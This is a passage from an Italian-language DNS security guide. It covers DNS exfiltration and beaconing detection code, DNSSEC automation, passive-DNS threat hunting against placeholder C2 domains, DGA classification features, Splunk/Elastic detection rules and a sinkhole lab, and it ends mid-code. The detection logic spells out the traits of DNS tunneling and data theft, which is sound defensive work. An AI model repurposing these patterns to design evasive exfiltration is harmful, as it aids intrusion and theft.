    if unique_count > UNIQUE_SUB_THRESHOLD:
        alerts.append(
            f"HIGH: {unique_count} subdomain unici "
            f"(soglia: {UNIQUE_SUB_THRESHOLD})"
        )

    # Check 3: beaconing regolare
    if len(tracker.timestamps) >= 10:
        intervals = [
            tracker.timestamps[i+1] - tracker.timestamps[i]
            for i in range(len(tracker.timestamps) - 1)
        ]
        mean_interval = sum(intervals) / len(intervals)
        if mean_interval > 0:
            std_dev = (
                sum((x - mean_interval) ** 2 for x in intervals)
                / len(intervals)
            ) ** 0.5
            regularity = std_dev / mean_interval
            if regularity < BEACON_REGULARITY_THRESHOLD:
                alerts.append(
                    f"MEDIUM: beaconing regolare rilevato "
                    f"(intervallo medio: {mean_interval:.1f}s, "
                    f"regolarita': {regularity:.3f})"
                )

    # Check 4: rapporto query TXT
    if tracker.query_count > 20:
        txt_ratio = tracker.txt_queries / tracker.query_count
        if txt_ratio > TXT_QUERY_RATIO_THRESHOLD:
            alerts.append(
                f"MEDIUM: {txt_ratio:.0%} query TXT "
                f"(soglia: {TXT_QUERY_RATIO_THRESHOLD:.0%})"
            )

    return len(alerts) > 0, alerts


def process_dns_log_line(
    line: str,
    trackers: dict[str, ExfilTracker],
) -> list[str]:
    """Processa una riga di log DNS e restituisce eventuali alert."""
    parts = line.strip().split(",")
    if len(parts) < 4:
        return []

    timestamp_str, client_ip, query_name, query_type = (
        parts[0], parts[1], parts[2], parts[3]
    )

    try:
        timestamp = float(timestamp_str)
    except ValueError:
        return []

    # Estrarre parent domain e subdomain
    labels = query_name.rstrip(".").split(".")
    if len(labels) < 3:
        return []

    parent = ".".join(labels[-2:])
    subdomain = ".".join(labels[:-2])
    key = f"{client_ip}|{parent}"

    tracker = trackers[key]
    tracker.query_count += 1
    tracker.total_bytes += len(subdomain)
    tracker.unique_subdomains.add(subdomain)
    tracker.timestamps.append(timestamp)
    tracker.max_label_len = max(tracker.max_label_len, max(len(l) for l in labels[:-2]))

    if query_type.upper() == "TXT":
        tracker.txt_queries += 1

    # Pulizia timestamp vecchi
    cutoff = timestamp - WINDOW_SECONDS
    tracker.timestamps = [t for t in tracker.timestamps if t > cutoff]

    # Analizzare ogni N query
    if tracker.query_count % 50 == 0:
        is_suspicious, alerts = analyze_exfil_risk(tracker)
        if is_suspicious:
            return [
                f"[EXFIL] client={client_ip} parent={parent} | {alert}"
                for alert in alerts
            ]

    return []
```

**Livello 3 — Policy DNS restrittive:**

- Limitare i tipi di record DNS permessi: bloccare query NULL, HINFO, e limitare TXT a domini whitelisted (SPF/DKIM del proprio dominio).
- Limitare la lunghezza massima dei subdomain label: query con label > 50 caratteri sono quasi certamente tunneling o esfiltrazione.
- Implementare rate limiting per-client per query uniche verso un singolo parent domain.
- Monitorare e alertare su domini con rapporto query-uniche/query-totali superiore al 95% (indicatore forte di tunneling).

**Livello 4 — Integrazione con DLP enterprise:**

Le soluzioni DLP enterprise moderne (Forcepoint, Symantec DLP, Microsoft Purview) possono essere integrate con il monitoring DNS per creare una vista unificata della data exfiltration. Il flusso e':

1. Il resolver DNS invia i query log al SIEM via dnstap/syslog
2. Il SIEM correla i pattern DNS sospetti con gli eventi DLP (accesso a file sensibili, upload, copia su USB)
3. Se un host mostra contemporaneamente accesso a dati classificati (evento DLP) e query DNS anomale (volume, entropia, beaconing), il livello di rischio sale automaticamente
4. Il SOAR puo' triggerare azioni: isolamento dell'host via EDR, blocco del parent domain sospetto in RPZ, notifica al SOC

---

## 14. DNSSEC — Sfide Operative Avanzate e Crittografia Post-Quantistica

### Automazione DNSSEC con BIND Inline Signing

La gestione manuale delle chiavi DNSSEC (generazione, firma, rollover) e' soggetta a errori operativi che possono rompere la catena di trust e rendere un dominio irrisolvibile. BIND 9.16+ supporta l'inline signing automatico con DNSSEC policy, eliminando la necessita' di script di firma manuali.

```bind
// /etc/bind/named.conf — DNSSEC inline signing con policy automatica

// Definire la policy DNSSEC
dnssec-policy "standard" {
    // KSK: ECDSAP256SHA256, rollover annuale
    keys {
        ksk key-directory lifetime P365D algorithm ecdsap256sha256;
        zsk key-directory lifetime P90D algorithm ecdsap256sha256;
    };

    // NSEC3 con salt rotation
    nsec3param iterations 0 optout no salt-length 8;

    // Timing di firma
    signatures-refresh P5D;      // Ri-firmare 5 giorni prima della scadenza
    signatures-validity P14D;     // Validita' firma: 14 giorni
    signatures-validity-dnskey P14D;

    // ZSK rollover automatico (pre-publish method)
    publish-safety PT1H;
    retire-safety PT1H;
    purge-keys P60D;

    // Parent DS update (richiede integrazione con registrar API)
    parent-ds-tt PT1H;
    parent-propagation-delay PT1H;
    parent-registration-delay P1D;

    // Directory per le chiavi
    key-directory "/etc/bind/keys";
};

// Applicare la policy alla zona
zone "example.com" {
    type primary;
    file "/etc/bind/zones/example.com.zone";
    dnssec-policy "standard";
    inline-signing yes;
};
```

Con questa configurazione, BIND gestisce automaticamente:
- Generazione di KSK e ZSK all'avvio se non esistono
- Firma dei record con il ZSK corrente
- Pre-publish del nuovo ZSK 90 giorni prima del rollover
- Ri-firma dei record quando le firme si avvicinano alla scadenza
- Generazione dei record NSEC3 con salt rotation

Il KSK rollover rimane semi-automatico: BIND genera il nuovo KSK e prepara il DS record, ma la pubblicazione del DS nella zona parent richiede intervento manuale (o integrazione con l'API del registrar).

### Monitoraggio Salute DNSSEC

La rottura della catena DNSSEC e' un evento critico che rende il dominio irrisolvibile per tutti i resolver validanti. Il monitoraggio continuo della salute DNSSEC e' obbligatorio.

```bash
#!/bin/bash
# dnssec-health-check.sh — Monitoraggio salute DNSSEC
# Esecuzione: crontab — ogni 15 minuti
#   */15 * * * * /usr/local/sbin/dnssec-health-check.sh

DOMAINS=(
    "example.com"
    "internal.example.com"
    "api.example.com"
)

RESOLVER="9.9.9.9"  # Resolver esterno validante per verifica indipendente
ALERT_EMAIL="security@example.com"
EXPIRY_WARNING_DAYS=7

for domain in "${DOMAINS[@]}"; do
    echo "=== Verifica DNSSEC: ${domain} ==="

    # Test 1: validazione DNSSEC con delv
    if ! delv @"${RESOLVER}" "${domain}" A +rtrace 2>/dev/null | grep -q "fully validated"; then
        echo "[CRITICAL] Validazione DNSSEC FALLITA per ${domain}"
        echo "DNSSEC validation failure for ${domain}" | \
            mail -s "[CRITICAL] DNSSEC Failure: ${domain}" "${ALERT_EMAIL}"
        continue
    fi
    echo "[OK] Validazione DNSSEC superata"

    # Test 2: verifica scadenza firme RRSIG
    expiry=$(dig @"${RESOLVER}" "${domain}" RRSIG +short 2>/dev/null | \
        head -1 | awk '{print $5}')
    if [ -n "${expiry}" ]; then
        expiry_epoch=$(date -d "${expiry:0:4}-${expiry:4:2}-${expiry:6:2}" +%s 2>/dev/null)
        now_epoch=$(date +%s)
        days_left=$(( (expiry_epoch - now_epoch) / 86400 ))
        if [ "${days_left}" -lt "${EXPIRY_WARNING_DAYS}" ]; then
            echo "[WARNING] RRSIG scade tra ${days_left} giorni"
            echo "RRSIG for ${domain} expires in ${days_left} days" | \
                mail -s "[WARNING] DNSSEC RRSIG Expiry: ${domain}" "${ALERT_EMAIL}"
        else
            echo "[OK] RRSIG valida per ${days_left} giorni"
        fi
    fi

    # Test 3: verifica DS nella zona parent
    ds_count=$(dig "${domain}" DS +short 2>/dev/null | wc -l)
    if [ "${ds_count}" -eq 0 ]; then
        echo "[CRITICAL] Nessun DS record trovato nella zona parent"
    else
        echo "[OK] ${ds_count} DS record presenti nella zona parent"
    fi

    # Test 4: verifica algoritmo
    algo=$(dig @"${RESOLVER}" "${domain}" DNSKEY +short 2>/dev/null | \
        head -1 | awk '{print $3}')
    case "${algo}" in
        13|14) echo "[OK] Algoritmo ECDSA (${algo})" ;;
        8) echo "[INFO] Algoritmo RSA-SHA256 (${algo}) — valido ma ECDSA raccomandato" ;;
        *) echo "[WARNING] Algoritmo ${algo} — verificare conformita'" ;;
    esac

    echo ""
done
```

### Crittografia Post-Quantistica per DNSSEC

La transizione verso algoritmi di firma post-quantistica e' uno dei temi piu' rilevanti per il futuro di DNSSEC nel periodo 2025-2035. I computer quantistici, quando raggiungono scala sufficiente, potranno rompere gli algoritmi di firma attualmente utilizzati (RSA, ECDSA) in tempo polinomiale tramite l'algoritmo di Shor.

**Stato della standardizzazione (2025-2026):**

NIST ha pubblicato nel 2024 gli standard per i primi algoritmi post-quantistici:
- **ML-DSA (Module-Lattice-based Digital Signature Algorithm):** basato su CRYSTALS-Dilithium, firma compatta e verifica veloce. Candidato principale per DNSSEC.
- **SLH-DSA (Stateless Hash-based Digital Signature Algorithm):** basato su SPHINCS+, firme piu' grandi ma sicurezza basata esclusivamente su funzioni hash (minima superficie di attacco crittografica).
- **FALCON:** firma compatta basata su lattice NTRU, in fase di standardizzazione.

**Sfide specifiche per DNSSEC con PQC:**

1. **Dimensione delle firme:** le firme ML-DSA sono ~2-3 KB (vs ~64 byte per ECDSA P-256). Questo aumenta drasticamente la dimensione delle risposte DNS, potenzialmente superando il limite EDNS0 di 4096 byte e forzando fallback a TCP.
2. **Dimensione delle chiavi:** le chiavi pubbliche PQC sono 1-2 KB (vs 64 byte per ECDSA). I record DNSKEY nella zona crescono proporzionalmente.
3. **Impatto sulle performance:** la firma e la verifica con algoritmi PQC sono computazionalmente piu' costose, aumentando il carico sui resolver validanti e sui server autoritativi.
4. **Fallback TCP:** con risposte DNS che superano regolarmente 4096 byte, il fallback a TCP diventa la norma anziche' l'eccezione, con implicazioni significative sulle performance del resolver e del server.

**Timeline di transizione proposta da Verisign/IETF:**

- 2025-2027: sperimentazione e standardizzazione degli algoritmi PQC per DNSSEC
- 2027-2029: dual-signing (firma con algoritmo classico + PQC) nelle zone TLD pilota
- 2029-2031: rollover della root KSK a chiave PQC
- 2031-2034: deprecazione degli algoritmi classici, completamento della transizione

Le organizzazioni dovrebbero iniziare ora a valutare l'impatto della transizione PQC sulla propria infrastruttura DNS: test di compatibilita' con risposte DNS oversize, verifica che i resolver supportino i nuovi algoritmi, e pianificazione del rollover delle chiavi.

---

## 15. Analisi Passiva DNS Avanzata e Threat Hunting

### Tecniche di Pivot nel Passive DNS

Il passive DNS e' uno degli strumenti piu' potenti per la threat intelligence e l'incident response. La tecnica fondamentale e' il "pivoting": partendo da un indicatore noto (dominio malevolo, IP C2, nameserver), si scoprono indicatori correlati attraverso le relazioni nel database passive DNS.

**Pivot patterns comuni:**

1. **Dominio → IP → altri domini:** dato un dominio malevolo noto, trovare l'IP di risoluzione, poi tutti gli altri domini che risolvono allo stesso IP. Rivela l'intera infrastruttura dell'attaccante ospitata sullo stesso server.

2. **IP → dominio → NS → altri domini sullo stesso NS:** risalire dai domini al nameserver autoritativo, poi trovare tutti i domini serviti dallo stesso NS. Utile per identificare bulk registration di domini malevoli registrati nello stesso momento dallo stesso attaccante.

3. **Dominio → WHOIS → altri domini dello stesso registrant:** combinare passive DNS con dati WHOIS per identificare tutti i domini registrati dalla stessa entita'. Particolarmente efficace quando il registrant non usa privacy protection.

4. **Timeline analysis:** osservare quando un dominio ha iniziato a risolvere verso un nuovo IP. Un dominio legittimo che improvvisamente cambia IP puo' indicare compromissione. Un dominio dormiente che si attiva puo' indicare staging di infrastruttura di attacco.

**Esempio pratico di threat hunting con passive DNS:**

```bash
# Scenario: un alert IDS segnala comunicazione verso evil-c2.example.net

# Passo 1: trovare l'IP del dominio C2
dig +short evil-c2.example.net A
# Output: 198.51.100.42

# Passo 2: query passive DNS per trovare tutti i domini sullo stesso IP
# (richiede accesso a DNSDB, PassiveTotal o CIRCL pDNS)
# Esempio con DNSDB API:
curl -sS -H "X-API-Key: ${DNSDB_API_KEY}" \
    "https://api.dnsdb.info/dnsdb/v2/lookup/rdata/ip/198.51.100.42" | \
    jq -r '.obj.rrname' | sort -u

# Output potenziale:
# evil-c2.example.net.
# backdoor-panel.example.net.
# phishing-kit.malicious.org.
# staging-server.attacker.com.

# Passo 3: per ogni dominio scoperto, verificare i nameserver
for domain in evil-c2.example.net backdoor-panel.example.net \
    phishing-kit.malicious.org staging-server.attacker.com; do
    echo "NS for ${domain}:"
    dig +short "${domain}" NS
done

# Passo 4: verificare nei log interni se qualche host ha comunicato
# con uno qualsiasi dei domini/IP scoperti
grep -F "198.51.100.42" /var/log/suricata/eve.json
grep -E "(evil-c2|backdoor-panel|phishing-kit|staging-server)" \
    /var/log/named/queries.log
```

### Correlazione Multi-Sorgente per DNS Threat Intelligence

Il valore del monitoring DNS aumenta esponenzialmente quando correlato con altre fonti di dati:

| Fonte dati | Correlazione con DNS | Valore |
|---|---|---|
| Netflow/IPFIX | IP di risoluzione DNS → flussi di traffico effettivi | Conferma comunicazione C2 reale (non solo risoluzione) |
| EDR telemetria | Processo → query DNS | Identifica quale processo genera la query sospetta |
| Proxy log | URL → dominio DNS | Correla navigation a siti di phishing con risoluzione DNS precedente |
| Certificati TLS | Dominio → certificato | Identifica certificati self-signed o Let's Encrypt su domini C2 |
| WHOIS storico | Dominio → registrant | Cluster di domini dello stesso attaccante |
| BGP routing | IP → ASN → country | Identifica hosting in giurisdizioni note per bulletproof hosting |

---

## 16. Machine Learning per DNS Security

### Modelli di Classificazione per DGA Detection

Le tecniche di machine learning hanno dimostrato efficacia superiore ai metodi euristici (entropia, n-gram) per la detection di DGA, specialmente per le varianti dictionary-based che generano domini dall'aspetto naturale.

**Feature engineering per classificazione DNS:**

```python
#!/usr/bin/env python3
"""Feature extraction per classificazione ML di domini DNS.

Estrae feature statistiche e lessicali da nomi di dominio per
alimentare modelli di classificazione (Random Forest, XGBoost).
"""

import math
import re
from collections import Counter
from typing import NamedTuple


class DomainFeatures(NamedTuple):
    """Feature vector per un dominio DNS."""
    length: int                     # Lunghezza del SLD
    entropy: float                  # Entropia di Shannon
    consonant_ratio: float          # Rapporto consonanti
    digit_ratio: float              # Rapporto cifre
    vowel_consonant_ratio: float    # Rapporto vocali/consonanti
    unique_char_ratio: float        # Rapporto caratteri unici/totali
    max_consecutive_consonants: int # Max consonanti consecutive
    max_consecutive_digits: int     # Max cifre consecutive
    has_hyphen: bool                # Contiene trattino
    bigram_avg_freq: float          # Frequenza media dei bigrammi (inglese)
    hex_ratio: float                # Rapporto caratteri hex [a-f0-9]
    numeric_segments: int           # Segmenti numerici separati da lettere
    label_count: int                # Numero di label nel FQDN


# Frequenza bigrammi inglesi (top 30, normalizzata)
ENGLISH_BIGRAMS = {
    "th": 3.56, "he": 3.07, "in": 2.43, "er": 2.05, "an": 1.99,
    "re": 1.85, "on": 1.76, "at": 1.49, "en": 1.45, "nd": 1.35,
    "ti": 1.34, "es": 1.34, "or": 1.28, "te": 1.27, "of": 1.17,
    "ed": 1.17, "is": 1.13, "it": 1.12, "al": 1.09, "ar": 1.07,
    "st": 1.05, "to": 1.04, "nt": 1.04, "ng": 0.95, "se": 0.93,
    "ha": 0.93, "as": 0.87, "ou": 0.87, "io": 0.83, "le": 0.83,
}


def extract_features(fqdn: str) -> DomainFeatures:
    """Estrae il feature vector completo da un FQDN."""
    parts = fqdn.rstrip(".").split(".")
    sld = parts[-2] if len(parts) >= 2 else parts[0]
    sld_lower = sld.lower()

    length = len(sld_lower)
    if length == 0:
        length = 1  # evitare divisione per zero

    # Entropia
    freq = Counter(sld_lower)
    entropy = -sum(
        (c / length) * math.log2(c / length) for c in freq.values()
    )

    # Ratios
    vowels = set("aeiou")
    consonants = set("bcdfghjklmnpqrstvwxyz")
    n_vowels = sum(1 for c in sld_lower if c in vowels)
    n_consonants = sum(1 for c in sld_lower if c in consonants)
    n_digits = sum(1 for c in sld_lower if c.isdigit())
    n_unique = len(set(sld_lower))
    hex_chars = set("abcdef0123456789")
    n_hex = sum(1 for c in sld_lower if c in hex_chars)

    # Max consecutive consonants / digits
    max_cons = max(
        (len(m.group()) for m in re.finditer(r'[bcdfghjklmnpqrstvwxyz]+', sld_lower)),
        default=0
    )
    max_dig = max(
        (len(m.group()) for m in re.finditer(r'\d+', sld_lower)),
        default=0
    )

    # Bigram frequency
    bigrams = [sld_lower[i:i+2] for i in range(len(sld_lower)-1)]
    if bigrams:
        bigram_freq = sum(
            ENGLISH_BIGRAMS.get(bg, 0.0) for bg in bigrams
        ) / len(bigrams)
    else:
        bigram_freq = 0.0

    # Numeric segments
    num_segments = len(re.findall(r'\d+', sld_lower))

    return DomainFeatures(
        length=length,
        entropy=round(entropy, 4),
        consonant_ratio=round(n_consonants / length, 4),
        digit_ratio=round(n_digits / length, 4),
        vowel_consonant_ratio=round(
            n_vowels / n_consonants if n_consonants > 0 else 0.0, 4
        ),
        unique_char_ratio=round(n_unique / length, 4),
        max_consecutive_consonants=max_cons,
        max_consecutive_digits=max_dig,
        has_hyphen="-" in sld,
        bigram_avg_freq=round(bigram_freq, 4),
        hex_ratio=round(n_hex / length, 4),
        numeric_segments=num_segments,
        label_count=len(parts),
    )
```

**Modelli raccomandati per DNS classification (2025-2026):**

| Modello | Accuracy tipica DGA | Vantaggi | Limitazioni |
|---|---|---|---|
| Random Forest | 95-98% | Interpretabile, veloce, robusto | Meno efficace su dictionary DGA |
| XGBoost / LightGBM | 96-99% | Ottime performance, feature importance | Richiede tuning iperparametri |
| LSTM (deep learning) | 97-99% | Non richiede feature engineering | Computazionalmente costoso, black box |
| 1D-CNN | 95-97% | Opera direttamente su sequenze di caratteri | Richiede GPU per training |
| Transformer-based | 98-99%+ | Stato dell'arte per pattern complessi | Richiede dati di training significativi |

**Sfide operative del ML per DNS security:**

1. **Concept drift:** le famiglie DGA evolvono. Un modello trainato sui DGA del 2024 potrebbe non rilevare varianti del 2026. Retraining periodico e' obbligatorio.
2. **Adversarial evasion:** gli attaccanti possono generare domini che ottimizzano le feature per apparire legittimi al modello ML. La diversita' delle feature e l'ensemble di modelli mitigano parzialmente.
3. **False positive rate:** anche un modello con 99% accuracy, applicato a milioni di query DNS al giorno, genera migliaia di falsi positivi. La calibrazione delle soglie di decisione e la combinazione con altre sorgenti di dati e' essenziale.
4. **Latenza:** la classificazione in tempo reale di ogni query DNS richiede modelli con inferenza < 1ms. Modelli complessi (LSTM, Transformer) necessitano di ottimizzazione (quantizzazione, pruning) o deployment su hardware dedicato.

### Unsupervised Anomaly Detection sul Traffico DNS

Per scenari dove non sono disponibili dataset etichettati di training, i modelli unsupervised possono identificare anomalie nel traffico DNS:

- **Isolation Forest:** efficace per identificare pattern DNS che deviano dalla distribuzione normale (query con feature estreme).
- **DBSCAN clustering:** raggruppa i domini per similarita' delle feature. I cluster piccoli e isolati contengono potenziali DGA o tunneling.
- **Autoencoders:** trainati sul traffico DNS "normale", producono alto errore di ricostruzione per query anomale (DGA, tunneling, esfiltrazione).

---

## 17. DNS Abuse — Processi di Takedown e Risposta

### Procedura di Takedown DNS

Quando viene identificata un'infrastruttura DNS malevola (dominio di phishing, C2, malware distribution), il processo di takedown segue una procedura strutturata.

**Flusso di takedown:**

```
1. IDENTIFICAZIONE
   │ Alert SIEM/IDS → conferma analista SOC → classificazione della minaccia
   ↓
2. DOCUMENTAZIONE
   │ Raccolta evidenze: screenshot, WHOIS, passive DNS, certificati,
   │ hash malware, timestamp, chain of custody
   ↓
3. NOTIFICA AL REGISTRAR
   │ Abuse contact del registrar (da WHOIS) → report con evidenze
   │ Template: RFC 2142 abuse@registrar.com
   │ Formati standard: IODEF (RFC 7970), X-ARF, testo libero
   ↓
4. ESCALATION (se il registrar non risponde in 24-48h)
   │ a) Notifica al registry (TLD operator)
   │ b) Complaint a ICANN Contractual Compliance
   │ c) Notifica a CERT nazionali (CERT-IT, CERT-EU)
   │ d) Segnalazione a Google Safe Browsing / Microsoft SmartScreen
   ↓
5. BLOCCO LOCALE IMMEDIATO (parallelo ai passi 3-4)
   │ Aggiornare RPZ → bloccare il dominio al resolver interno
   │ Aggiungere a sinkhole → monitorare host infetti
   ↓
6. VERIFICA TAKEDOWN
   │ Confermare che il dominio non risolve piu' (NXDOMAIN)
   │ o che il registrar ha messo il dominio in serverHold/clientHold
   ↓
7. POST-INCIDENTE
   │ Aggiornare IOC nei feed di threat intelligence
   │ Documentare nel sistema di incident management
   │ Verificare che nessun host interno sia ancora compromesso
```

**Novita' ICANN 2025-2026:**

ICANN ha introdotto nel 2025 requisiti piu' stringenti per i registrar riguardo alla mitigazione dell'abuso DNS. I registrar sono ora obbligati a "prendere tempestivamente le azioni di mitigazione ragionevolmente necessarie per fermare o interrompere l'uso del nome registrato per abuso DNS" quando ricevono evidenze di malware, botnet, phishing o pharming. Tra aprile 2024 e agosto 2025, ICANN ha avviato 400 indagini relative ai nuovi requisiti di mitigazione dell'abuso DNS, portando alla mitigazione di quasi 20.000 nomi di dominio malevoli.

### DNS Abuse Reporting — Template Strutturato

Per massimizzare l'efficacia del report di abuso, utilizzare un formato strutturato:

```
Subject: DNS Abuse Report — [dominio] — [tipo: phishing/malware/C2/botnet]
To: abuse@[registrar].com

1. REPORTED DOMAIN:
   Domain: evil-phishing.example.com
   Registrar: [nome registrar] (da WHOIS)
   Registration date: [data] (da WHOIS)
   Name servers: ns1.evil-ns.com, ns2.evil-ns.com

2. ABUSE TYPE:
   [x] Phishing
   [ ] Malware distribution
   [ ] Command & Control (C2)
   [ ] Botnet infrastructure

3. EVIDENCE:
   - Screenshot: [URL o allegato]
   - VirusTotal: https://www.virustotal.com/gui/domain/evil-phishing.example.com
   - URLhaus: [URL report]
   - Passive DNS: [record di risoluzione]
   - First observed: [timestamp UTC ISO 8601]
   - Still active: [si/no, timestamp verifica]

4. TARGETED BRAND/ORGANIZATION:
   [Nome dell'organizzazione impersonata]

5. REQUESTING ACTION:
   Immediate suspension of the domain pending investigation.

6. REPORTER:
   Name: [nome]
   Organization: [organizzazione]
   Email: [email]
   CERT/SOC reference: [numero ticket interno]
```

---

## 18. Knot Resolver — Configurazione Hardened

Knot Resolver (kresd), sviluppato da CZ.NIC (il registry del ccTLD .cz), e' un resolver DNS moderno con architettura modulare e sicurezza by-default. A differenza di BIND e Unbound, Knot Resolver utilizza un'architettura a moduli Lua, dove la maggior parte delle funzionalita' avanzate sono implementate come moduli opzionali, riducendo la superficie di attacco del core.

**Caratteristiche di sicurezza native:**

- DNSSEC validation abilitata di default (dalla versione 4.0)
- Supporto RFC 5011 (aggiornamento automatico trust anchor)
- Supporto RFC 7646 (negative trust anchors)
- Supporto nativo DoT e DoH (in ingresso e in uscita)
- Aggressive NSEC caching (RFC 8198)
- QNAME minimization (RFC 7816) abilitata di default
- Cache sharing tra processi (per deployment multi-istanza)

**Configurazione hardened:**

```lua
-- /etc/knot-resolver/kresd.conf — configurazione sicura

-- Interfacce di ascolto
net.listen('10.0.0.1', 53, { kind = 'dns' })
net.listen('10.0.0.1', 853, { kind = 'tls' })
net.listen('10.0.0.1', 443, { kind = 'doh2' })
net.listen('127.0.0.1', 53, { kind = 'dns' })

-- TLS per connessioni in ingresso (DoT/DoH)
net.tls('/etc/knot-resolver/tls/server.crt',
        '/etc/knot-resolver/tls/server.key')

-- Moduli di sicurezza
modules.load('hints > iterate')       -- /etc/hosts override
modules.load('predict')               -- prefetching predittivo
modules.load('stats')                 -- statistiche
modules.load('policy')                -- policy engine

-- Access control
-- Permettere solo reti interne
view:addr('10.0.0.0/8', policy.all(policy.PASS))
view:addr('172.16.0.0/12', policy.all(policy.PASS))
view:addr('192.168.0.0/16', policy.all(policy.PASS))
view:addr('127.0.0.0/8', policy.all(policy.PASS))
view:addr('0.0.0.0/0', policy.all(policy.DENY))

-- Protezione DNS rebinding — bloccare risposte con IP privati
-- da query per domini esterni
policy.add(policy.RPZ(
    policy.DENY,
    '/etc/knot-resolver/rpz/rebinding.rpz'
))

-- RPZ per threat intelligence
policy.add(policy.rpz(
    policy.DENY,
    '/etc/knot-resolver/rpz/malware-block.rpz',
    true  -- watch per aggiornamenti automatici
))

-- Forwarding crittografato verso upstream
policy.add(policy.all(
    policy.TLS_FORWARD({
        {'1.1.1.1', hostname='cloudflare-dns.com'},
        {'9.9.9.9', hostname='dns.quad9.net'},
    })
))

-- Cache configuration
cache.size = 256 * MB
cache.max_ttl(86400)
cache.min_ttl(0)

-- Rate limiting
modules.load('ratelimit')
ratelimit.config({
    rate = 100,        -- query al secondo per IP
    instant = 50,      -- burst ammesso
    window = 1,        -- finestra in secondi
})

-- Logging
modules.load('nsid')
log_level('info')
```

---

## 19. Query SIEM Avanzate per DNS Security

### Splunk — Detection Rules per DNS

```spl
# === DGA Detection ===
# Identifica domini con alta entropia nel second-level domain
index=dns sourcetype=dns_query
| rex field=query "(?<sld>[^.]+)\.[^.]+$"
| eval sld_len=len(sld)
| eval char_count=mvcount(split(sld,""))
| eval unique_chars=mvcount(mvdedup(split(sld,"")))
| eval unique_ratio=unique_chars/sld_len
| where sld_len > 10 AND unique_ratio > 0.7
| stats count by src_ip, query, sld, sld_len, unique_ratio
| where count < 3
| sort -unique_ratio

# === DNS Tunneling — Volume Analysis ===
# Identifica client con volume anomalo di query uniche verso un singolo parent domain
index=dns sourcetype=dns_query
| rex field=query "(?<parent_domain>[^.]+\.[^.]+)$"
| stats dc(query) as unique_queries, count as total_queries,
        avg(query_length) as avg_len,
        max(query_length) as max_len
    by src_ip, parent_domain
| where unique_queries > 100 AND avg_len > 40
| sort -unique_queries

# === DNS Beaconing Detection ===
# Identifica comunicazioni periodiche regolari (C2 beaconing)
index=dns sourcetype=dns_query
| rex field=query "(?<parent_domain>[^.]+\.[^.]+)$"
| sort 0 src_ip, parent_domain, _time
| streamstats current=f last(_time) as prev_time by src_ip, parent_domain
| eval interval=_time-prev_time
| stats count, avg(interval) as avg_interval,
        stdev(interval) as std_interval,
        values(query) as sample_queries
    by src_ip, parent_domain
| where count > 20 AND avg_interval > 5 AND avg_interval < 3600
| eval jitter_ratio=std_interval/avg_interval
| where jitter_ratio < 0.3
| sort jitter_ratio

# === NXDOMAIN Spike Detection ===
# Identifica spike anomali di risposte NXDOMAIN (possibile DGA o water torture)
index=dns sourcetype=dns_response rcode=NXDOMAIN
| timechart span=5m count by src_ip
| foreach * [eval alert_<<FIELD>>=if('<<FIELD>>' > 50, 1, 0)]

# === DNS Data Exfiltration — Payload Size ===
# Calcola il volume totale di dati trasportati nei subdomain per client
index=dns sourcetype=dns_query
| rex field=query "^(?<subdomain>.+)\.(?<parent>[^.]+\.[^.]+)$"
| eval subdomain_bytes=len(subdomain)
| stats sum(subdomain_bytes) as total_exfil_bytes,
        count as query_count,
        dc(query) as unique_queries
    by src_ip, parent
| where total_exfil_bytes > 5000
| sort -total_exfil_bytes
```

### Elastic / OpenSearch — Detection Rules

```json
{
  "rule": {
    "name": "DNS Tunneling - High Volume Unique Subdomains",
    "type": "threshold",
    "query": {
      "bool": {
        "must": [
          { "match": { "event.dataset": "dns" } },
          { "range": { "dns.question.name_length": { "gte": 40 } } }
        ],
        "must_not": [
          { "terms": { "dns.question.registered_domain": [
            "google.com", "microsoft.com", "amazonaws.com",
            "cloudfront.net", "akamaiedge.net"
          ]}}
        ]
      }
    },
    "threshold": {
      "field": ["source.ip", "dns.question.registered_domain"],
      "value": 100,
      "cardinality": {
        "field": "dns.question.subdomain",
        "value": 80
      }
    },
    "schedule": { "interval": "5m" },
    "severity": "high",
    "risk_score": 73
  }
}
```

```json
{
  "rule": {
    "name": "DNS DGA - High Entropy Domain Query",
    "type": "query",
    "query": {
      "bool": {
        "must": [
          { "match": { "event.dataset": "dns" } },
          { "range": { "dns.question.entropy": { "gte": 3.8 } } },
          { "range": { "dns.question.name_length": { "gte": 12 } } }
        ],
        "must_not": [
          { "exists": { "field": "dns.question.registered_domain_whitelisted" } }
        ]
      }
    },
    "schedule": { "interval": "5m" },
    "severity": "medium",
    "risk_score": 47
  }
}
```

---

## 20. Laboratorio Avanzato

### Lab 7 — Sinkhole Server con Logging e Dashboard

```bash
#!/bin/bash
# lab-sinkhole-setup.sh — Deploy di un sinkhole server con logging
# Il sinkhole intercetta le connessioni dai client infetti e logga i dettagli

SINKHOLE_IP="10.0.0.100"
LOG_DIR="/var/log/sinkhole"
mkdir -p "${LOG_DIR}"

# Server HTTP sinkhole con logging dettagliato (Python)
cat > /opt/sinkhole/http_sinkhole.py << 'PYEOF'
#!/usr/bin/env python3
"""HTTP sinkhole server — logga connessioni da host infetti."""

import json
import logging
import sys
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler


LOG_FILE = "/var/log/sinkhole/http_connections.jsonl"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(message)s",
)


class SinkholeHandler(BaseHTTPRequestHandler):
    """Handler che logga ogni richiesta e restituisce una warning page."""

    def _log_request(self, method: str) -> None:
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "src_ip": self.client_address[0],
            "src_port": self.client_address[1],
            "method": method,
            "path": self.path,
            "host_header": self.headers.get("Host", ""),
            "user_agent": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "content_type": self.headers.get("Content-Type", ""),
        }
        logging.info(json.dumps(entry))

    def do_GET(self) -> None:
        self._log_request("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        warning_page = """<!DOCTYPE html>
<html lang="it">
<head><title>DNS Sinkhole - Accesso Bloccato</title></head>
<body style="font-family: sans-serif; text-align: center; padding: 50px;">
<h1 style="color: #c00;">Accesso Bloccato</h1>
<p>Il dominio richiesto e' stato identificato come malevolo
e bloccato dal sistema di sicurezza DNS.</p>
<p>Se ritieni che questo blocco sia un errore,
contatta il team IT: security@example.com</p>
<hr>
<small>DNS Sinkhole — Security Team</small>
</body></html>"""
        self.wfile.write(warning_page.encode())

    def do_POST(self) -> None:
        self._log_request("POST")
        # Leggere e loggare il body (potenziale C2 callback payload)
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 0 and content_length < 10240:
